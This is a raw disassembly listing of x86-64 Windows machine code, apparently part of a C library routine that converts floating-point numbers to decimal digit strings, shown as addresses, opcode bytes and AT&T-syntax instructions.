   140007729:	f2 0f 2a 4d d4       	cvtsi2sdl -0x2c(%rbp),%xmm1
   14000772e:	f2 0f 59 4d 08       	mulsd  0x8(%rbp),%xmm1
   140007733:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
   140007737:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   14000773c:	8b 45 d4             	mov    -0x2c(%rbp),%eax
   14000773f:	8d 48 30             	lea    0x30(%rax),%ecx
   140007742:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140007746:	48 8d 50 01          	lea    0x1(%rax),%rdx
   14000774a:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   14000774e:	89 ca                	mov    %ecx,%edx
   140007750:	88 10                	mov    %dl,(%rax)
   140007752:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   140007757:	66 0f ef c9          	pxor   %xmm1,%xmm1
   14000775b:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
   14000775f:	7a 0e                	jp     0x14000776f
   140007761:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140007765:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
   140007769:	0f 84 da 00 00 00    	je     0x140007849
   14000776f:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007772:	39 45 6c             	cmp    %eax,0x6c(%rbp)
   140007775:	0f 85 aa 00 00 00    	jne    0x140007825
   14000777b:	83 7d 44 00          	cmpl   $0x0,0x44(%rbp)
   14000777f:	74 12                	je     0x140007793
   140007781:	83 7d 44 01          	cmpl   $0x1,0x44(%rbp)
   140007785:	74 4b                	je     0x1400077d2
   140007787:	c7 45 64 10 00 00 00 	movl   $0x10,0x64(%rbp)
   14000778e:	e9 e0 09 00 00       	jmp    0x140008173
   140007793:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   140007798:	f2 0f 58 c0          	addsd  %xmm0,%xmm0
   14000779c:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   1400077a1:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   1400077a6:	66 0f 2f 45 08       	comisd 0x8(%rbp),%xmm0
   1400077ab:	77 28                	ja     0x1400077d5
   1400077ad:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   1400077b2:	66 0f 2e 45 08       	ucomisd 0x8(%rbp),%xmm0
   1400077b7:	7a 63                	jp     0x14000781c
   1400077b9:	66 0f 2e 45 08       	ucomisd 0x8(%rbp),%xmm0
   1400077be:	75 5c                	jne    0x14000781c
   1400077c0:	8b 45 d4             	mov    -0x2c(%rbp),%eax
   1400077c3:	83 e0 01             	and    $0x1,%eax
   1400077c6:	85 c0                	test   %eax,%eax
   1400077c8:	74 52                	je     0x14000781c
   1400077ca:	eb 09                	jmp    0x1400077d5
   1400077cc:	90                   	nop
   1400077cd:	eb 07                	jmp    0x1400077d6
   1400077cf:	90                   	nop
   1400077d0:	eb 04                	jmp    0x1400077d6
   1400077d2:	90                   	nop
   1400077d3:	eb 01                	jmp    0x1400077d6
   1400077d5:	90                   	nop
   1400077d6:	c7 45 64 20 00 00 00 	movl   $0x20,0x64(%rbp)
   1400077dd:	eb 17                	jmp    0x1400077f6
   1400077df:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400077e3:	48 3b 45 e8          	cmp    -0x18(%rbp),%rax
   1400077e7:	75 0d                	jne    0x1400077f6
   1400077e9:	83 45 58 01          	addl   $0x1,0x58(%rbp)
   1400077ed:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400077f1:	c6 00 30             	movb   $0x30,(%rax)
   1400077f4:	eb 10                	jmp    0x140007806
   1400077f6:	48 83 6d 00 01       	subq   $0x1,0x0(%rbp)
   1400077fb:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400077ff:	0f b6 00             	movzbl (%rax),%eax
   140007802:	3c 39                	cmp    $0x39,%al
   140007804:	74 d9                	je     0x1400077df
   140007806:	48 8b 45 00          	mov    0x0(%rbp),%rax
   14000780a:	48 8d 50 01          	lea    0x1(%rax),%rdx
   14000780e:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140007812:	0f b6 10             	movzbl (%rax),%edx
   140007815:	83 c2 01             	add    $0x1,%edx
   140007818:	88 10                	mov    %dl,(%rax)
   14000781a:	eb 2e                	jmp    0x14000784a
   14000781c:	c7 45 64 10 00 00 00 	movl   $0x10,0x64(%rbp)
   140007823:	eb 25                	jmp    0x14000784a
   140007825:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007828:	83 c0 01             	add    $0x1,%eax
   14000782b:	89 45 b0             	mov    %eax,-0x50(%rbp)
   14000782e:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   140007833:	f2 0f 10 05 fd 4c 00 	movsd  0x4cfd(%rip),%xmm0        # 0x14000c538
   14000783a:	00 
   14000783b:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   14000783f:	f2 0f 11 45 a8       	movsd  %xmm0,-0x58(%rbp)
   140007844:	e9 c6 fe ff ff       	jmp    0x14000770f
   140007849:	90                   	nop
   14000784a:	e9 24 09 00 00       	jmp    0x140008173
   14000784f:	8b 45 7c             	mov    0x7c(%rbp),%eax
   140007852:	89 45 4c             	mov    %eax,0x4c(%rbp)
   140007855:	8b 45 78             	mov    0x78(%rbp),%eax
   140007858:	89 45 48             	mov    %eax,0x48(%rbp)
   14000785b:	48 c7 45 20 00 00 00 	movq   $0x0,0x20(%rbp)
   140007862:	00 
   140007863:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140007867:	48 89 45 18          	mov    %rax,0x18(%rbp)
   14000786b:	83 7d 50 00          	cmpl   $0x0,0x50(%rbp)
   14000786f:	0f 84 e0 00 00 00    	je     0x140007955
   140007875:	8b 45 b4             	mov    -0x4c(%rbp),%eax
   140007878:	8b 55 f8             	mov    -0x8(%rbp),%edx
   14000787b:	29 c2                	sub    %eax,%edx
   14000787d:	89 55 b0             	mov    %edx,-0x50(%rbp)
   140007880:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007883:	8d 50 01             	lea    0x1(%rax),%edx
   140007886:	89 55 b0             	mov    %edx,-0x50(%rbp)
   140007889:	8b 95 98 00 00 00    	mov    0x98(%rbp),%edx
   14000788f:	29 c2                	sub    %eax,%edx
   140007891:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   140007898:	8b 40 04             	mov    0x4(%rax),%eax
   14000789b:	39 c2                	cmp    %eax,%edx
   14000789d:	7d 43                	jge    0x1400078e2
   14000789f:	83 bd b0 00 00 00 03 	cmpl   $0x3,0xb0(%rbp)
   1400078a6:	74 3a                	je     0x1400078e2
   1400078a8:	83 bd b0 00 00 00 05 	cmpl   $0x5,0xb0(%rbp)
   1400078af:	74 31                	je     0x1400078e2
   1400078b1:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   1400078b8:	8b 40 04             	mov    0x4(%rax),%eax
   1400078bb:	8b 95 98 00 00 00    	mov    0x98(%rbp),%edx
   1400078c1:	29 c2                	sub    %eax,%edx
   1400078c3:	8d 42 01             	lea    0x1(%rdx),%eax
   1400078c6:	89 45 b0             	mov    %eax,-0x50(%rbp)
   1400078c9:	83 bd b0 00 00 00 01 	cmpl   $0x1,0xb0(%rbp)
   1400078d0:	7e 68                	jle    0x14000793a
   1400078d2:	83 7d 6c 00          	cmpl   $0x0,0x6c(%rbp)
   1400078d6:	7e 62                	jle    0x14000793a
   1400078d8:	8b 45 b0             	mov    -0x50(%rbp),%eax
   1400078db:	39 45 6c             	cmp    %eax,0x6c(%rbp)
   1400078de:	7d 5a                	jge    0x14000793a
   1400078e0:	eb 0a                	jmp    0x1400078ec
   1400078e2:	83 bd b0 00 00 00 01 	cmpl   $0x1,0xb0(%rbp)
   1400078e9:	7e 50                	jle    0x14000793b
   1400078eb:	90                   	nop
   1400078ec:	8b 45 6c             	mov    0x6c(%rbp),%eax
   1400078ef:	83 e8 01             	sub    $0x1,%eax
   1400078f2:	89 45 60             	mov    %eax,0x60(%rbp)
   1400078f5:	8b 45 48             	mov    0x48(%rbp),%eax
   1400078f8:	3b 45 60             	cmp    0x60(%rbp),%eax
   1400078fb:	7c 08                	jl     0x140007905
   1400078fd:	8b 45 60             	mov    0x60(%rbp),%eax
   140007900:	29 45 48             	sub    %eax,0x48(%rbp)
   140007903:	eb 19                	jmp    0x14000791e
   140007905:	8b 45 48             	mov    0x48(%rbp),%eax
   140007908:	29 45 60             	sub    %eax,0x60(%rbp)
   14000790b:	8b 45 60             	mov    0x60(%rbp),%eax
   14000790e:	01 45 3c             	add    %eax,0x3c(%rbp)
   140007911:	8b 45 60             	mov    0x60(%rbp),%eax
   140007914:	01 45 78             	add    %eax,0x78(%rbp)
   140007917:	c7 45 48 00 00 00 00 	movl   $0x0,0x48(%rbp)
   14000791e:	8b 45 6c             	mov    0x6c(%rbp),%eax
   140007921:	89 45 b0             	mov    %eax,-0x50(%rbp)
   140007924:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007927:	85 c0                	test   %eax,%eax
   140007929:	79 10                	jns    0x14000793b
   14000792b:	8b 45 b0             	mov    -0x50(%rbp),%eax
   14000792e:	29 45 4c             	sub    %eax,0x4c(%rbp)
   140007931:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%rbp)
   140007938:	eb 01                	jmp    0x14000793b
   14000793a:	90                   	nop
   14000793b:	8b 45 b0             	mov    -0x50(%rbp),%eax
   14000793e:	01 45 7c             	add    %eax,0x7c(%rbp)
   140007941:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007944:	01 45 40             	add    %eax,0x40(%rbp)
   140007947:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000794c:	e8 f6 0f 00 00       	call   0x140008947
   140007951:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140007955:	83 7d 4c 00          	cmpl   $0x0,0x4c(%rbp)
   140007959:	7e 26                	jle    0x140007981
   14000795b:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000795f:	7e 20                	jle    0x140007981
   140007961:	8b 55 40             	mov    0x40(%rbp),%edx
   140007964:	8b 45 4c             	mov    0x4c(%rbp),%eax
   140007967:	39 c2                	cmp    %eax,%edx
   140007969:	0f 4e c2             	cmovle %edx,%eax
   14000796c:	89 45 b0             	mov    %eax,-0x50(%rbp)
   14000796f:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007972:	29 45 7c             	sub    %eax,0x7c(%rbp)
   140007975:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007978:	29 45 4c             	sub    %eax,0x4c(%rbp)
   14000797b:	8b 45 b0             	mov    -0x50(%rbp),%eax
   14000797e:	29 45 40             	sub    %eax,0x40(%rbp)
   140007981:	83 7d 78 00          	cmpl   $0x0,0x78(%rbp)
   140007985:	7e 7e                	jle    0x140007a05
   140007987:	83 7d 50 00          	cmpl   $0x0,0x50(%rbp)
   14000798b:	74 65                	je     0x1400079f2
   14000798d:	83 7d 48 00          	cmpl   $0x0,0x48(%rbp)
   140007991:	7e 3b                	jle    0x1400079ce
   140007993:	8b 55 48             	mov    0x48(%rbp),%edx
   140007996:	48 8b 45 18          	mov    0x18(%rbp),%rax
   14000799a:	48 89 c1             	mov    %rax,%rcx
   14000799d:	e8 11 12 00 00       	call   0x140008bb3
   1400079a2:	48 89 45 18          	mov    %rax,0x18(%rbp)
   1400079a6:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   1400079aa:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400079ae:	48 89 c1             	mov    %rax,%rcx
   1400079b1:	e8 d7 0f 00 00       	call   0x14000898d
   1400079b6:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   1400079ba:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400079be:	48 89 c1             	mov    %rax,%rcx
   1400079c1:	e8 c8 0d 00 00       	call   0x14000878e
   1400079c6:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   1400079ca:	48 89 45 28          	mov    %rax,0x28(%rbp)
   1400079ce:	8b 45 78             	mov    0x78(%rbp),%eax
   1400079d1:	2b 45 48             	sub    0x48(%rbp),%eax
   1400079d4:	89 45 60             	mov    %eax,0x60(%rbp)
   1400079d7:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   1400079db:	74 28                	je     0x140007a05
   1400079dd:	8b 55 60             	mov    0x60(%rbp),%edx
   1400079e0:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400079e4:	48 89 c1             	mov    %rax,%rcx
   1400079e7:	e8 c7 11 00 00       	call   0x140008bb3
   1400079ec:	48 89 45 28          	mov    %rax,0x28(%rbp)
   1400079f0:	eb 13                	jmp    0x140007a05
   1400079f2:	8b 55 78             	mov    0x78(%rbp),%edx
   1400079f5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400079f9:	48 89 c1             	mov    %rax,%rcx
   1400079fc:	e8 b2 11 00 00       	call   0x140008bb3
   140007a01:	48 89 45 28          	mov    %rax,0x28(%rbp)
   140007a05:	b9 01 00 00 00       	mov    $0x1,%ecx
   140007a0a:	e8 38 0f 00 00       	call   0x140008947
   140007a0f:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140007a13:	83 7d 3c 00          	cmpl   $0x0,0x3c(%rbp)
   140007a17:	7e 13                	jle    0x140007a2c
   140007a19:	8b 55 3c             	mov    0x3c(%rbp),%edx
   140007a1c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140007a20:	48 89 c1             	mov    %rax,%rcx
   140007a23:	e8 8b 11 00 00       	call   0x140008bb3
   140007a28:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140007a2c:	c7 45 38 00 00 00 00 	movl   $0x0,0x38(%rbp)
   140007a33:	83 bd b0 00 00 00 01 	cmpl   $0x1,0xb0(%rbp)
   140007a3a:	7f 29                	jg     0x140007a65
   140007a3c:	8b 45 b4             	mov    -0x4c(%rbp),%eax
   140007a3f:	83 f8 01             	cmp    $0x1,%eax
   140007a42:	75 21                	jne    0x140007a65
   140007a44:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   140007a4b:	8b 40 04             	mov    0x4(%rax),%eax
   140007a4e:	83 c0 01             	add    $0x1,%eax
   140007a51:	39 45 f4             	cmp    %eax,-0xc(%rbp)
   140007a54:	7e 0f                	jle    0x140007a65
   140007a56:	83 45 7c 01          	addl   $0x1,0x7c(%rbp)
   140007a5a:	83 45 40 01          	addl   $0x1,0x40(%rbp)
   140007a5e:	c7 45 38 01 00 00 00 	movl   $0x1,0x38(%rbp)
   140007a65:	83 7d 3c 00          	cmpl   $0x0,0x3c(%rbp)
   140007a69:	74 22                	je     0x140007a8d
   140007a6b:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140007a6f:	8b 40 14             	mov    0x14(%rax),%eax
   140007a72:	8d 50 ff             	lea    -0x1(%rax),%edx
   140007a75:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140007a79:	48 63 d2             	movslq %edx,%rdx
   140007a7c:	48 83 c2 04          	add    $0x4,%rdx
   140007a80:	8b 44 90 08          	mov    0x8(%rax,%rdx,4),%eax
   140007a84:	89 c1                	mov    %eax,%ecx
   140007a86:	e8 c5 f0 ff ff       	call   0x140006b50
   140007a8b:	eb 05                	jmp    0x140007a92
   140007a8d:	b8 1f 00 00 00       	mov    $0x1f,%eax
   140007a92:	2b 45 40             	sub    0x40(%rbp),%eax
   140007a95:	83 e8 04             	sub    $0x4,%eax
   140007a98:	83 e0 1f             	and    $0x1f,%eax
   140007a9b:	89 45 b0             	mov    %eax,-0x50(%rbp)
   140007a9e:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007aa1:	01 45 4c             	add    %eax,0x4c(%rbp)
   140007aa4:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007aa7:	01 45 7c             	add    %eax,0x7c(%rbp)
   140007aaa:	83 7d 7c 00          	cmpl   $0x0,0x7c(%rbp)
   140007aae:	7e 13                	jle    0x140007ac3
   140007ab0:	8b 55 7c             	mov    0x7c(%rbp),%edx
   140007ab3:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007ab7:	48 89 c1             	mov    %rax,%rcx
   140007aba:	e8 b1 12 00 00       	call   0x140008d70
   140007abf:	48 89 45 28          	mov    %rax,0x28(%rbp)
   140007ac3:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007ac6:	01 45 40             	add    %eax,0x40(%rbp)
   140007ac9:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   140007acd:	7e 13                	jle    0x140007ae2
   140007acf:	8b 55 40             	mov    0x40(%rbp),%edx
   140007ad2:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140007ad6:	48 89 c1             	mov    %rax,%rcx
   140007ad9:	e8 92 12 00 00       	call   0x140008d70
   140007ade:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140007ae2:	83 7d 54 00          	cmpl   $0x0,0x54(%rbp)
   140007ae6:	74 5a                	je     0x140007b42
   140007ae8:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140007aec:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007af0:	48 89 c1             	mov    %rax,%rcx
   140007af3:	e8 05 14 00 00       	call   0x140008efd
   140007af8:	85 c0                	test   %eax,%eax
   140007afa:	79 46                	jns    0x140007b42
   140007afc:	83 6d 58 01          	subl   $0x1,0x58(%rbp)
   140007b00:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007b04:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140007b0a:	ba 0a 00 00 00       	mov    $0xa,%edx
   140007b0f:	48 89 c1             	mov    %rax,%rcx
   140007b12:	e8 02 0d 00 00       	call   0x140008819
   140007b17:	48 89 45 28          	mov    %rax,0x28(%rbp)
   140007b1b:	83 7d 50 00          	cmpl   $0x0,0x50(%rbp)
   140007b1f:	74 1b                	je     0x140007b3c
   140007b21:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140007b25:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140007b2b:	ba 0a 00 00 00       	mov    $0xa,%edx
   140007b30:	48 89 c1             	mov    %rax,%rcx
   140007b33:	e8 e1 0c 00 00       	call   0x140008819
   140007b38:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140007b3c:	8b 45 68             	mov    0x68(%rbp),%eax
   140007b3f:	89 45 6c             	mov    %eax,0x6c(%rbp)
   140007b42:	83 7d 6c 00          	cmpl   $0x0,0x6c(%rbp)
   140007b46:	0f 8f 81 00 00 00    	jg     0x140007bcd
   140007b4c:	83 bd b0 00 00 00 02 	cmpl   $0x2,0xb0(%rbp)
   140007b53:	7e 78                	jle    0x140007bcd
   140007b55:	83 7d 6c 00          	cmpl   $0x0,0x6c(%rbp)
   140007b59:	78 37                	js     0x140007b92
   140007b5b:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140007b5f:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140007b65:	ba 05 00 00 00       	mov    $0x5,%edx
   140007b6a:	48 89 c1             	mov    %rax,%rcx
   140007b6d:	e8 a7 0c 00 00       	call   0x140008819
   140007b72:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140007b76:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140007b7a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007b7e:	48 89 c1             	mov    %rax,%rcx
   140007b81:	e8 77 13 00 00       	call   0x140008efd
   140007b86:	85 c0                	test   %eax,%eax
   140007b88:	7f 23                	jg     0x140007bad
   140007b8a:	eb 06                	jmp    0x140007b92
   140007b8c:	90                   	nop
   140007b8d:	eb 04                	jmp    0x140007b93
   140007b8f:	90                   	nop
   140007b90:	eb 01                	jmp    0x140007b93
   140007b92:	90                   	nop
   140007b93:	8b 85 b8 00 00 00    	mov    0xb8(%rbp),%eax
   140007b99:	f7 d0                	not    %eax
   140007b9b:	89 45 58             	mov    %eax,0x58(%rbp)
   140007b9e:	c7 45 64 10 00 00 00 	movl   $0x10,0x64(%rbp)
   140007ba5:	e9 84 05 00 00       	jmp    0x14000812e
   140007baa:	90                   	nop
   140007bab:	eb 01                	jmp    0x140007bae
   140007bad:	90                   	nop
   140007bae:	c7 45 64 20 00 00 00 	movl   $0x20,0x64(%rbp)
   140007bb5:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140007bb9:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140007bbd:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140007bc1:	c6 00 31             	movb   $0x31,(%rax)
   140007bc4:	83 45 58 01          	addl   $0x1,0x58(%rbp)
   140007bc8:	e9 61 05 00 00       	jmp    0x14000812e
   140007bcd:	83 7d 50 00          	cmpl   $0x0,0x50(%rbp)
   140007bd1:	0f 84 14 04 00 00    	je     0x140007feb
   140007bd7:	83 7d 4c 00          	cmpl   $0x0,0x4c(%rbp)
   140007bdb:	7e 13                	jle    0x140007bf0
   140007bdd:	8b 55 4c             	mov    0x4c(%rbp),%edx
   140007be0:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140007be4:	48 89 c1             	mov    %rax,%rcx
   140007be7:	e8 84 11 00 00       	call   0x140008d70
   140007bec:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140007bf0:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140007bf4:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140007bf8:	83 7d 38 00          	cmpl   $0x0,0x38(%rbp)
   140007bfc:	74 57                	je     0x140007c55
   140007bfe:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140007c02:	8b 40 08             	mov    0x8(%rax),%eax
   140007c05:	89 c1                	mov    %eax,%ecx
   140007c07:	e8 41 0a 00 00       	call   0x14000864d
   140007c0c:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140007c10:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140007c14:	8b 40 14             	mov    0x14(%rax),%eax
   140007c17:	48 98                	cltq
   140007c19:	48 83 c0 02          	add    $0x2,%rax
   140007c1d:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
   140007c24:	00 
   140007c25:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140007c29:	48 8d 50 10          	lea    0x10(%rax),%rdx
   140007c2d:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140007c31:	48 83 c0 10          	add    $0x10,%rax
   140007c35:	49 89 c8             	mov    %rcx,%r8
   140007c38:	48 89 c1             	mov    %rax,%rcx
   140007c3b:	e8 b8 24 00 00       	call   0x14000a0f8
   140007c40:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140007c44:	ba 01 00 00 00       	mov    $0x1,%edx
   140007c49:	48 89 c1             	mov    %rax,%rcx
   140007c4c:	e8 1f 11 00 00       	call   0x140008d70
   140007c51:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140007c55:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%rbp)
   140007c5c:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140007c60:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007c64:	48 89 c1             	mov    %rax,%rcx
   140007c67:	e8 62 ec ff ff       	call   0x1400068ce
   140007c6c:	83 c0 30             	add    $0x30,%eax
   140007c6f:	89 45 74             	mov    %eax,0x74(%rbp)
   140007c72:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140007c76:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007c7a:	48 89 c1             	mov    %rax,%rcx
   140007c7d:	e8 7b 12 00 00       	call   0x140008efd
   140007c82:	89 45 60             	mov    %eax,0x60(%rbp)
   140007c85:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140007c89:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140007c8d:	48 89 c1             	mov    %rax,%rcx
   140007c90:	e8 38 13 00 00       	call   0x140008fcd
   140007c95:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140007c99:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   140007c9d:	8b 40 10             	mov    0x10(%rax),%eax
   140007ca0:	85 c0                	test   %eax,%eax
   140007ca2:	75 15                	jne    0x140007cb9
   140007ca4:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
   140007ca8:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007cac:	48 89 c1             	mov    %rax,%rcx
   140007caf:	e8 49 12 00 00       	call   0x140008efd
   140007cb4:	89 45 5c             	mov    %eax,0x5c(%rbp)
   140007cb7:	eb 07                	jmp    0x140007cc0
   140007cb9:	c7 45 5c 01 00 00 00 	movl   $0x1,0x5c(%rbp)
   140007cc0:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   140007cc4:	48 89 c1             	mov    %rax,%rcx
   140007cc7:	e8 c2 0a 00 00       	call   0x14000878e
   140007ccc:	83 7d 5c 00          	cmpl   $0x0,0x5c(%rbp)
   140007cd0:	75 70                	jne    0x140007d42
   140007cd2:	83 bd b0 00 00 00 00 	cmpl   $0x0,0xb0(%rbp)
   140007cd9:	75 67                	jne    0x140007d42
   140007cdb:	48 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%rax
   140007ce2:	8b 00                	mov    (%rax),%eax
   140007ce4:	83 e0 01             	and    $0x1,%eax
   140007ce7:	85 c0                	test   %eax,%eax
   140007ce9:	75 57                	jne    0x140007d42
   140007ceb:	83 7d 44 00          	cmpl   $0x0,0x44(%rbp)
   140007cef:	75 51                	jne    0x140007d42
   140007cf1:	83 7d 74 39          	cmpl   $0x39,0x74(%rbp)
   140007cf5:	0f 84 01 02 00 00    	je     0x140007efc
   140007cfb:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   140007cff:	7f 20                	jg     0x140007d21
   140007d01:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007d05:	8b 40 14             	mov    0x14(%rax),%eax
   140007d08:	83 f8 01             	cmp    $0x1,%eax
   140007d0b:	7f 0b                	jg     0x140007d18
   140007d0d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007d11:	8b 40 18             	mov    0x18(%rax),%eax
   140007d14:	85 c0                	test   %eax,%eax
   140007d16:	74 14                	je     0x140007d2c
   140007d18:	c7 45 64 10 00 00 00 	movl   $0x10,0x64(%rbp)
   140007d1f:	eb 0b                	jmp    0x140007d2c
   140007d21:	83 45 74 01          	addl   $0x1,0x74(%rbp)
   140007d25:	c7 45 64 20 00 00 00 	movl   $0x20,0x64(%rbp)
   140007d2c:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140007d30:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140007d34:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140007d38:	8b 55 74             	mov    0x74(%rbp),%edx
   140007d3b:	88 10                	mov    %dl,(%rax)
   140007d3d:	e9 ec 03 00 00       	jmp    0x14000812e
   140007d42:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   140007d46:	78 2b                	js     0x140007d73
   140007d48:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   140007d4c:	0f 85 96 01 00 00    	jne    0x140007ee8
   140007d52:	83 bd b0 00 00 00 00 	cmpl   $0x0,0xb0(%rbp)
   140007d59:	0f 85 89 01 00 00    	jne    0x140007ee8
   140007d5f:	48 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%rax
   140007d66:	8b 00                	mov    (%rax),%eax
   140007d68:	83 e0 01             	and    $0x1,%eax
   140007d6b:	85 c0                	test   %eax,%eax
   140007d6d:	0f 85 75 01 00 00    	jne    0x140007ee8
   140007d73:	83 7d 44 00          	cmpl   $0x0,0x44(%rbp)
   140007d77:	0f 84 db 00 00 00    	je     0x140007e58
   140007d7d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007d81:	8b 40 14             	mov    0x14(%rax),%eax
   140007d84:	83 f8 01             	cmp    $0x1,%eax
   140007d87:	7f 0f                	jg     0x140007d98
   140007d89:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007d8d:	8b 40 18             	mov    0x18(%rax),%eax
   140007d90:	85 c0                	test   %eax,%eax
   140007d92:	0f 84 c0 00 00 00    	je     0x140007e58
   140007d98:	83 7d 44 02          	cmpl   $0x2,0x44(%rbp)
   140007d9c:	0f 85 83 00 00 00    	jne    0x140007e25
   140007da2:	c7 45 64 10 00 00 00 	movl   $0x10,0x64(%rbp)
   140007da9:	e9 24 01 00 00       	jmp    0x140007ed2
   140007dae:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140007db2:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140007db6:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140007dba:	8b 55 74             	mov    0x74(%rbp),%edx
   140007dbd:	88 10                	mov    %dl,(%rax)
   140007dbf:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140007dc3:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140007dc9:	ba 0a 00 00 00       	mov    $0xa,%edx
   140007dce:	48 89 c1             	mov    %rax,%rcx
   140007dd1:	e8 43 0a 00 00       	call   0x140008819
   140007dd6:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140007dda:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140007dde:	48 3b 45 18          	cmp    0x18(%rbp),%rax
   140007de2:	75 08                	jne    0x140007dec
   140007de4:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140007de8:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140007dec:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140007df0:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140007df4:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007df8:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140007dfe:	ba 0a 00 00 00       	mov    $0xa,%edx
